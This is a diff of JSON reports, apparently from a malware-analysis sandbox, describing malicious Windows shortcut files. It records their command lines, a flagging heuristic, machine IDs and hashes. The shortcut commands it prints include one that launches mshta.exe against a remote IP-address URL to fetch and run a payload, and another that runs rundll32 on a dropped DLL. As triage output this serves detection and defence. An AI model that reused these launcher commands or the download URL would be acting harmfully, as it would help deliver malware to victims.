@@ -1,22 +1,22 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 501,
+    "score": 1001,
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [2.538011611618207, 3.5906314390239964, 3.680165331217427, 1.3410173717321385, 4.195909270873606, 1.8916085136217475, 3.368546576667349, 3.0443941193584534, 2.071439706933589, 3.855931060301677, 2.303831637608537, 2.538011611618207, 1.8916085136217475, 4.222593650305008, 2.3246507615479635, 2.8397005586868334, 2.6963072011385814, 2.779094498080773, 2.756913261744642, 2.7413638163281506, 2.8175193223507025, 3.809397528383803, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.39045213081320695, 2.9231819981463323, 1.0934255569822822, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.7752593054584659, 3.7094320646611725, 3.4048269576665082, 4.923181998146335, 4.741363816328152, 0.0]}}",
+        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [3.725235434382858, 3.3629613523404243, 2.869541297597716, 2.708514994641224, 3.8843135277997978, 2.708514994641224, 3.300555342766645, 2.258637091169717, 4.222208536590743, 2.7757140325142533, 3.157912166762854, 3.1963737052243917, 3.3244454874942027, 0.0, 0.0, 0.0, 0.0, 2.828116154299239, 0.37119390349406906, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 4.11886749115226, 0.0, 0.0, 0.0, 0.0, 2.5465935642949384, 1.4377544837306804, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.914258009319946, 4.354285871987246, 4.786790198827112, 3.6838554275221678, 2.6528225031764996, 2.5683127888314132, 2.899740941970648, 0.0]}}",
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
         "depth": 0,
         "heuristic": null,
         "tags": {},
-        "title_text": "File entropy: 2.934",
+        "title_text": "File entropy: 2.525",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"IDList, LinkInfo, RelativePath, CommandArgs, IconFile, Unicode, ExpString\", \"file_attributes\": \"Archive\", \"create_date\": \"2022:02:11 18:01:47+00:00\", \"access_date\": \"2022:04:19 09:59:03+00:00\", \"modify_date\": \"2022:02:11 18:01:47+00:00\", \"target_file_size\": 289792, \"icon_index\": 5, \"run_window\": \"Normal\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"cmd.exe\", \"drive_type\": \"Fixed Disk\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"relative_path\": \"..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\", \"command_line_arguments\": \"/c start rundll32.exe mkl2n.dll,kXlNkCKgFC\", \"icon_file_name\": \"%systemroot%\\\\system32\\\\imageres.dll\", \"machine_id\": \"desktop-30fdj39\"}",
+        "body": "{\"flags\": \"IDList, LinkInfo, CommandArgs, IconFile, Unicode, ExpString, ExpIcon\", \"file_attributes\": \"Archive\", \"create_date\": \"2019:12:29 14:27:21+00:00\", \"access_date\": \"2019:12:29 14:27:21+00:00\", \"modify_date\": \"2018:01:01 04:48:41+00:00\", \"target_file_size\": 14848, \"icon_index\": 1, \"run_window\": \"Normal\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"mshta.exe\", \"drive_type\": \"Fixed Disk\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\mshta.exe\", \"command_line_arguments\": \"http://194.180.174.158/18.01/quicker.rtf\", \"icon_file_name\": \"C:\\\\Program Files (x86)\\\\quicker.EXE\", \"machine_id\": \"desktop-farl139\"}",
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 0,
@@ -25,10 +25,10 @@
           "file": {
             "date": {
               "creation": [
-                "2022:02:11 18:01:47+00:00"
+                "2019:12:29 14:27:21+00:00"
               ],
               "last_modified": [
-                "2022:02:11 18:01:47+00:00"
+                "2018:01:01 04:48:41+00:00"
               ]
             }
           }
@@ -47,21 +47,21 @@
           "file": {
             "name": {
               "extracted": [
-                "cmd.exe"
+                "mshta.exe"
               ]
             },
             "shortcut": {
               "command_line": [
-                "C:\\Windows\\System32\\cmd.exe /c start rundll32.exe mkl2n.dll,kXlNkCKgFC"
+                "C:\\Windows\\System32\\mshta.exe http://194.180.174.158/18.01/quicker.rtf"
               ],
               "icon_location": [
-                "%systemroot%\\system32\\imageres.dll"
+                "C:\\Program Files (x86)\\quicker.EXE"
               ],
               "machine_id": [
-                "desktop-30fdj39"
+                "desktop-farl139"
               ],
               "tracker_mac": [
-                "EB:33:6A:3B:D0:E3"
+                "08:00:27:2E:05:1D"
               ]
             }
           }
@@ -71,7 +71,33 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"machine_identifier\": \"desktop-30fdj39\"}",
+        "body": "Download of http://194.180.174.158/18.01/quicker.rtf",
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 9,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {
+          "network": {
+            "static": {
+              "uri": [
+                "http://194.180.174.158/18.01/quicker.rtf"
+              ]
+            }
+          }
+        },
+        "title_text": "Mshta shortcut execution",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"machine_identifier\": \"desktop-farl139\"}",
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 1,
@@ -89,7 +115,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"command_line_arguments\": \"/c start rundll32.exe mkl2n.dll,kXlNkCKgFC\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"relative_path\": \"..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\cmd.exe\"}",
+        "body": "{\"local_base_path\": \"C:\\\\Windows\\\\System32\\\\mshta.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\mshta.exe\"}",
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 1,
@@ -108,16 +134,11 @@
     ]
   },
   "files": {
-    "extracted": [
-      {
-        "name": "ff73a98739.bat",
-        "sha256": "ff73a987392c413f8a2d04dddd67a844b09dc385fb710aaa0ae99687d00f06e2"
-      }
-    ],
+    "extracted": [],
     "supplementary": [
       {
         "name": "features.json",
-        "sha256": "8bfc33dea495669961ef7b71c08fc4b0c2e5c74c06729a9c72b39f940d141484"
+        "sha256": "d6cc72e36b620108423758e09b01968c9cd4e6800cc6ca31e2de580da386e86f"
       }
     ]
   },
@@ -132,6 +153,11 @@
         "attack_ids": [],
         "heur_id": 5,
         "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 9,
+        "signatures": []
       }
     ],
     "tags": {
@@ -139,49 +165,56 @@
         {
           "heur_id": null,
           "signatures": [],
-          "value": "2022:02:11 18:01:47+00:00"
+          "value": "2019:12:29 14:27:21+00:00"
         }
       ],
       "file.date.last_modified": [
         {
           "heur_id": null,
           "signatures": [],
-          "value": "2022:02:11 18:01:47+00:00"
+          "value": "2018:01:01 04:48:41+00:00"
         }
       ],
       "file.name.extracted": [
         {
           "heur_id": null,
           "signatures": [],
-          "value": "cmd.exe"
+          "value": "mshta.exe"
         }
       ],
       "file.shortcut.command_line": [
         {
           "heur_id": null,
           "signatures": [],
-          "value": "C:\\Windows\\System32\\cmd.exe /c start rundll32.exe mkl2n.dll,kXlNkCKgFC"
+          "value": "C:\\Windows\\System32\\mshta.exe http://194.180.174.158/18.01/quicker.rtf"
         }
       ],
       "file.shortcut.icon_location": [
         {
           "heur_id": null,
           "signatures": [],
-          "value": "%systemroot%\\system32\\imageres.dll"
+          "value": "C:\\Program Files (x86)\\quicker.EXE"
         }
       ],
       "file.shortcut.machine_id": [
         {
           "heur_id": null,
           "signatures": [],
-          "value": "desktop-30fdj39"
+          "value": "desktop-farl139"
         }
       ],
       "file.shortcut.tracker_mac": [
         {
           "heur_id": null,
           "signatures": [],
-          "value": "EB:33:6A:3B:D0:E3"
+          "value": "08:00:27:2E:05:1D"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 9,
+          "signatures": [],
+          "value": "http://194.180.174.158/18.01/quicker.rtf"
         }
       ]
     },
